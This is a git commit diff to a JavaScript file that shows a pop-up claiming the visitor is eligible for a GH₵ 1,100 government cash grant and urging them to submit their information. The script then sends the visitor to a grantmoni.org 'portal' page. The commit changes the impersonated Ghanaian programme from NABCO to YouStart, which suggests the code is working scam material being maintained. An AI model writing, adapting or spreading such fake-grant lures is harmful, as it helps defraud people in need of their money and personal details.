02f685f0780e20fce0f81c84472b7ba54c53ae80
grntmoni <casket-90-crystal@icloud.com>
2025-10-10 01:55:54 +0100

    Update activation1.js

--- activation1.js
+++ activation1.js
@@ -1,5 +1,5 @@
 var password = 'Submit Now'
-password=prompt('2025 NABCO Cash Grant Portal: Congratulations, you are eligible to receive the GH₵ 1,100 NABCO Support Cash Transfer, Kindly press OK to submit your information and receive your GH₵ 1,100 now','Submit Now');
+password=prompt('2025 YouStart Cash Grant Portal: Congratulations, you are eligible to receive the GH₵ 1,100 YouStart Support Cash Transfer, Kindly press OK to submit your information and receive your GH₵ 1,100 now','Submit Now');
 if (password != 'Submit Now') {
-location.href='https://grantmoni.org/NABCO-Cash-Grant-1100-Portal.html';
+location.href='https://grantmoni.org/YouStart-Cash-Grant-1100-Portal.html';
 }
